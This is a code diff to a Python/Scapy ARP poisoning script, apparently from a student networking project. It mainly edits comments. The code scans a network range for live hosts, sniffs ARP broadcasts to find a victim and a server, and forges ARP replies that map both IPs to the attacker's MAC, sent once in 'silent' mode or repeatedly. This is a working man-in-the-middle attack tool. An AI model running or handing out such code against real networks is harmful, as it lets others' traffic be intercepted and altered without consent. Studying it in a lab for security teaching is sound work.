@@ -3,20 +3,10 @@ import argparse;
 import time;
 import ipaddress;
 
-# TODO:
-# - Mitm optie maken die je automatisch mitm maakt
-# - Silent vs All out options
 
-### This is the file for ARP poisoning. I'm not sure if it works or how to test it :) 
-# first listen to ARP broadcast, then respond to victim, dan spam server with arp request, send victim a lot of arp responses and hope that we are the quickest.
+### This is the file for ARP poisoning. 
+# first listen to ARP broadcast, then send victim and server arp responses and hope that we are the quickest.
 
-# Example run code that should do something, where x is ip range: 
-# python ARPpoisoning.py --scan x 
-# When specific victim and server are found, where y and z are ip adresses: 
-# python ARPpoisoning.py --victim y --server z
-
-
-## First is my attempt at scanning the network. I'm not sure if this work and if this is what we wanted it to do if it does work.
 # Scanning network for devices, this returns (or is supposed to return) all live hosts in a given range 'ip'.
 def network_scan(ip_range, batch_threshold=256):
     hosts = []
@@ -34,6 +24,7 @@ def network_scan(ip_range, batch_threshold=256):
         print(f"[!] Invalid IP range: {ip_range} - {e}")
     return hosts
 
+#scan a single network range
 def _scan_single_range(ip):
     arp = sc.ARP(pdst=ip)
     broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -47,7 +38,6 @@ def _scan_single_range(ip):
 ## Here is where the main parts of the ARP poisoning is supposed to happen. 
 # 1. We need to be able to start the poisoning attack.
 # 2. We need to be able to get a current MAC adress. 
-# 3. we need to stop the attack in a proper way.
 
 
 # (2.) Get the MAC adress of a given IP adress
@@ -60,6 +50,7 @@ def get_mac(ip):
         return received.hwsrc
     return None
 
+#do the poisoning
 def arp_poisoning(victim_ip, server_ip, mode):
     iface = "enp0s3"
     attacker_mac = sc.get_if_hwaddr(iface)
@@ -67,6 +58,7 @@ def arp_poisoning(victim_ip, server_ip, mode):
     server_mac = None
 
     try:
+        # wait for arp broadcast from client
         if victim_ip and not server_ip:
             print("Waiting for ARP from victim to discover server IP...")
             pkt = sc.sniff(filter="arp", iface=iface, store=1,
@@ -75,6 +67,7 @@ def arp_poisoning(victim_ip, server_ip, mode):
             victim_mac = get_mac(victim_ip)
             server_mac = get_mac(server_ip)
 
+        # wait for any arp broadcast
         elif not victim_ip and not server_ip:
             print("[Waiting for any ARP broadcast to discover both IPs...")
             pkt = sc.sniff(filter="arp", iface=iface, store=1,
@@ -84,6 +77,7 @@ def arp_poisoning(victim_ip, server_ip, mode):
             victim_mac = get_mac(victim_ip)
             server_mac = get_mac(server_ip)
 
+        #get mac addresses from given IP's
         else:
             victim_mac = get_mac(victim_ip)
             server_mac = get_mac(server_ip)
@@ -95,10 +89,12 @@ def arp_poisoning(victim_ip, server_ip, mode):
             print("[!] Could not resolve MAC addresses.")
             return None, None
 
+        # create the fake responses
         fake_packet_victim = sc.Ether(dst=victim_mac) / sc.ARP(
             op=2, pdst=victim_ip, hwdst=victim_mac, psrc=server_ip, hwsrc=attacker_mac)
         fake_packet_server = sc.ARP(op=2, pdst=server_ip, psrc=victim_ip, hwsrc=attacker_mac)
 
+        #send the responses
         if mode == "silent":
             print("Silent mode: sending one-time ARP poison")
             sc.sendp(fake_packet_victim, iface=iface, verbose=False)
@@ -116,7 +112,7 @@ def arp_poisoning(victim_ip, server_ip, mode):
         return None, None
     
 
-
+# helper functions to filter packet sniffs
 def check_arp_server_client(pkt, server_ip, client_ip):
     if pkt.haslayer(sc.ARP):
         arp = pkt[sc.ARP]
